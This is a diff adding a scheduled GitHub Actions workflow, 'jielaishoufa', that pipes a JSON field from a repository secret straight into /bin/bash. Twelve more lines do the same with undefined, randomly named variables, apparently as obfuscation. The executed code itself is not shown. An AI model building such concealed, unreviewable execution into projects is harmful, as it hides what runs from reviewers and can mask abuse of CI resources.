@@ -1,0 +1,29 @@
+name: jielaishoufa
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jielaishoufa
+        env:
+          jyoy92996: ${{ secrets.jyoy92996 }}
+        run: |
+          echo $jyoy92996 | jq -r .aiaks1452 | /bin/bash
+          echo $lpmjj45 | jq -r .zffk9 | /bin/bash
+          echo $vxf4045 | jq -r .fqgfv19 | /bin/bash
+          echo $bj13 | jq -r .arbs91909 | /bin/bash
+          echo $tm24388 | jq -r .ss3 | /bin/bash
+          echo $mz11001 | jq -r .n4 | /bin/bash
+          echo $lv18 | jq -r .zpm5090 | /bin/bash
+          echo $dehie3 | jq -r .wo51214 | /bin/bash
+          echo $uofyz5 | jq -r .l9729 | /bin/bash
+          echo $nbvh7 | jq -r .jp942 | /bin/bash
+          echo $rd43129 | jq -r .ce31 | /bin/bash
+          echo $xya827 | jq -r .ezvu443 | /bin/bash
+          echo $wlvip7 | jq -r .sc805 | /bin/bash
+
